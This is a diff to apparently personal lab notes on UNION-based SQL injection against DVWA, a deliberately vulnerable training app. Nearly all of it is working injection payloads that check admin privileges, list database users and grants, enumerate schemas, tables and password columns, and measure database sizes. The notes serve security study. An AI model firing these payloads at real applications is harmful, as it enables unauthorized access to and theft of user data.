@@ -58,17 +58,53 @@ Sometimes when we try to retrieve error messages. Sometimes the warning messages
 ' UNION SELECT NULL, USER()#
 ```
 
-- The current database is `dvwa@localhost`
+- The current database is `dvwa@localhost`.
 
 ![[1.3 - Current User.png]]
 
-#### 1.2.1.4 - Schema Database Enumeration
+- Check the current database user is DBA (database administrator).
+
+```sql
+' UNION SELECT super_priv, NULL FROM mysql.user WHERE user = 'dvwa'#
+
+' UNION SELECT CONCAT(user, '->', 'SUPER', '->', super_priv), NULL FROM mysql.user WHERE user = 'dvwa'#
+
+' UNION SELECT GROUP_CONCAT(user, '->', 'SUPER', '->', super_priv), NULL FROM mysql.user WHERE user = 'dvwa'#
+```
+
+![[1.4 - DBA User.png]]
+
+#### 1.2.1.4 - Enumerate DBMS Users
+
+- Enumerate DBMS users.
+
+```sql
+' UNION SELECT user, NULL FROM mysql.user#
+
+' UNION SELECT GROUP_CONCAT(user), NULL FROM mysql.user#
+
+' UNION SELECT NULL, GROUP_CONCAT(PRIVILEGE_TYPE, '->', GRANTEE, '->', IS_GRANTABLE, '<br>') FROM information_schema.USER_PRIVILEGES WHERE PRIVILEGE_TYPE LIKE 'SUPER' AND GRANTEE LIKE "'dvwa'%"#
+```
+
+![[1.5 - Enumerate DBMS Users.png]]
+
+- Enumerate DBA users.
+
+```sql
+' UNION SELECT GROUP_CONCAT(user, '->', 'SUPER', '->', super_priv, '\n'), NULL FROM mysql.user#
+
+' UNION SELECT NULL, GROUP_CONCAT(PRIVILEGE_TYPE, '->', GRANTEE, '->', IS_GRANTABLE, '<br>') FROM information_schema.USER_PRIVILEGES WHERE PRIVILEGE_TYPE LIKE 'SUPER'#
+```
+
+![[1.6 - Enumerate DBA Users.png]]
+
+#### 1.2.1.5 - Schema Database Enumeration
 
 ```sql
 ' UNION SELECT NULL, schema_name FROM information_schema.schemata#
 ```
 
-![[1.4 - Enumerate Databases.png]]
+![[1.7 - Enumerate Databases.png]]
 
 Let's enumerate the tables.
 
@@ -78,7 +114,7 @@ Let's enumerate the tables.
 ' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()#
 ```
 
-![[1.5 - Enumerate Tables With The Current Database.png]]
+![[1.8 - Enumerate Tables With The Current Database.png]]
 
 You can narrow it down.
 
@@ -100,7 +136,7 @@ Let's enumerate the columns.
 ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_schema = database() AND table_name = 'users'#
 ```
 
-![[1.6 - Enumerate Columns With The Current Database.png]]
+![[1.9 - Enumerate Columns With The Current Database.png]]
 
 Let's note down the columns we've discovered that are potential to retrieve data
 
@@ -120,9 +156,9 @@ password
 ```sql
 ' UNION SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024 , 2) FROM information_schema.tables#
 
-' UNION SELECT CONCAT('Database: ', table_schema, ' -> ', ' Bytes Size: ', db_size), NULL FROM (SELECT table_schema, ROUND(SUM(data_length + index_length)) AS db_size FROM information_schema.tables GROUP BY table_schema) AS subquery#
+' UNION SELECT NULL, CONCAT('Database: ', table_schema, ' -> ', ' Bytes Size: ', db_size) FROM (SELECT table_schema, ROUND(SUM(data_length + index_length)) AS db_size FROM information_schema.tables GROUP BY table_schema) AS subquery#
 
-' UNION SELECT GROUP_CONCAT('Database: ', table_schema, ' -> ', ' Bytes Size: ', db_size, '\n'), NULL FROM (SELECT table_schema, ROUND(SUM(data_length + index_length)) AS db_size FROM information_schema.tables GROUP BY table_schema) AS subquery#
+' UNION SELECT NULL, GROUP_CONCAT('Database: ', table_schema, ' -> ', ' Bytes Size: ', db_size, '\n') FROM (SELECT table_schema, ROUND(SUM(data_length + index_length)) AS db_size FROM information_schema.tables GROUP BY table_schema) AS subquery#
 ```
 
 - Kilobytes
@@ -130,9 +166,9 @@ password
 ```sql
 ' UNION SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024 , 2) FROM information_schema.tables GROUP BY table_schema#
 
-' UNION SELECT CONCAT('Database: ', table_schema, ' -> ', ' KB Size: ', db_size), NULL FROM (SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024, 2) AS db_size FROM information_schema.tables GROUP BY table_schema) AS subquery#
+' UNION SELECT NULL, CONCAT('Database: ', table_schema, ' -> ', ' KB Size: ', db_size) FROM (SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024, 2) AS db_size FROM information_schema.tables GROUP BY table_schema) AS subquery#
 
-' UNION SELECT GROUP_CONCAT('Database: ', table_schema, ' -> ', ' KB Size: ', db_size, '\n'), NULL FROM (SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024, 2) AS db_size FROM information_schema.tables GROUP BY table_schema) AS subquery#
+' UNION SELECT NULL, GROUP_CONCAT('Database: ', table_schema, ' -> ', ' KB Size: ', db_size, '\n') FROM (SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024, 2) AS db_size FROM information_schema.tables GROUP BY table_schema) AS subquery#
 ```
 
 - Megabytes
@@ -140,9 +176,9 @@ password
 ```sql
 ' UNION SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) FROM information_schema.tables GROUP BY table_schema#
 
-' UNION SELECT CONCAT('Database: ', table_schema, ' -> ', ' MB Size: ', db_size), NULL FROM (SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) AS db_size FROM information_schema.tables GROUP BY table_schema) AS subquery#
+' UNION SELECT NULL, CONCAT('Database: ', table_schema, ' -> ', ' MB Size: ', db_size) FROM (SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) AS db_size FROM information_schema.tables GROUP BY table_schema) AS subquery#
 
-' UNION SELECT GROUP_CONCAT('Database: ', table_schema, ' -> ', ' MB Size: ', db_size, '\n'), NULL FROM (SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) AS db_size FROM information_schema.tables GROUP BY table_schema) AS subquery#
+' UNION SELECT NULL, GROUP_CONCAT('Database: ', table_schema, ' -> ', ' MB Size: ', db_size, '\n') FROM (SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) AS db_size FROM information_schema.tables GROUP BY table_schema) AS subquery#
 ```
 
 #### 1.2.1.2 - Current Database
@@ -150,17 +186,17 @@ password
 - Bytes
 
 ```sql
-' UNION SELECT CONCAT('Database: ', table_schema, ' -> ', ' Bytes Size: ', db_size), NULL FROM (SELECT table_schema, ROUND(SUM(data_length + index_length)) AS db_size FROM information_schema.tables WHERE table_schema = database()) AS subquery#
+' UNION SELECT NULL, CONCAT('Database: ', table_schema, ' -> ', ' Bytes Size: ', db_size) FROM (SELECT table_schema, ROUND(SUM(data_length + index_length)) AS db_size FROM information_schema.tables WHERE table_schema = database()) AS subquery#
 ```
 
 - Megabytes
 
 ```sql
-' UNION SELECT CONCAT('Database: ', table_schema, ' -> ', ' MB Size: ', db_size), NULL FROM (SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) AS db_size FROM information_schema.tables WHERE table_schema = database()) AS subquery#
+' UNION SELECT NULL, CONCAT('Database: ', table_schema, ' -> ', ' MB Size: ', db_size) FROM (SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) AS db_size FROM information_schema.tables WHERE table_schema = database()) AS subquery#
 ```
 
 - Gigabytes
 
 ```sql
-' UNION SELECT CONCAT('Database: ', table_schema, ' -> ', ' GB Size: ', db_size), NULL FROM (SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024 / 1024 / 1024, 2) AS db_size FROM information_schema.tables WHERE table_schema = database()) AS subquery#
+' UNION SELECT NULL, CONCAT('Database: ', table_schema, ' -> ', ' GB Size: ', db_size) FROM (SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024 / 1024 / 1024, 2) AS db_size FROM information_schema.tables WHERE table_schema = database()) AS subquery#
 ```
